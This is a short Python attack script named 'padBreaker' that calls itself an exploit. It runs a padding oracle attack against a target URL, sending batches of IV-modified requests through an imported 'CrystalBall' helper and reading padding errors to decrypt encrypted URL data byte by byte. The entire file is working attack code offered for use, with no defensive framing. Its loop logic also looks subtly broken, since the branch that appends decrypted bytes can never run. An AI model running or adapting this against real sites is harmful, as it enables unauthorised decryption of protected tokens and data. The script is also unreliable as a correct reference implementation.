#!/usr/bin/perl -e$_=$ARGV[0];exec(s{\w+$}{../exploit-env/bin/python3}r,@ARGV)

import sys

import CrystalBall

###############################

def main():
	introduction = 'Welcome to padBreaker: This exploit performs the padding oracle attack to decrypt urls - have fun\n'
	print('\n' + introduction)

	target = CrystalBall.URLHandler(*sys.argv[1:])
	engine = CrystalBall.AsyncRequest(20)
	engine.request([target.get_url()])

	print('Attempting to retrieve url:')
	print('Status code: {}, Response Length: {}\n'.format(*engine.results[0]))

	print('Starting attack')
	print('Checking return codes for padding errors ...\n')

	raw_bytes = target.to_bytearray()
	decryption = bytearray()
	iv_block = raw_bytes[0]
	non_iv_blocks = raw_bytes[1:]
	
	for i, block in enumerate(non_iv_blocks):
		print('BLOCK ' + str(i + 1))

		count = 0
		found = bytearray() 
		iv_update = bytearray() 

		while(count != target.size-1):
			# Make requests
			iv_array = target.generate_iv_list(iv_update)
			url_array = [[i, block] for i in iv_array]
			url_array = list(map(lambda x: target.get_url(x), url_array))
			engine.request(url_array)

			# find IV
			print('Responses for byte {}: {}'.format(target.size-count, engine.responses))
			found.insert(0, iv_array[engine.prophecy()][-(count+1)]^(count + 1))
			
			# Update IV or add decrypted block
			if (count != target.size-1):
				iv_update = bytearray([found[i]^(count+2) for i in range(count+1)])
			else:
				[decryption.append(n^m) for n, m in zip(found, iv_block)]
				iv_block = block
			count += 1

		print('\n' + str(decryption) + '\n')
		

if __name__ == '__main__':
	main()
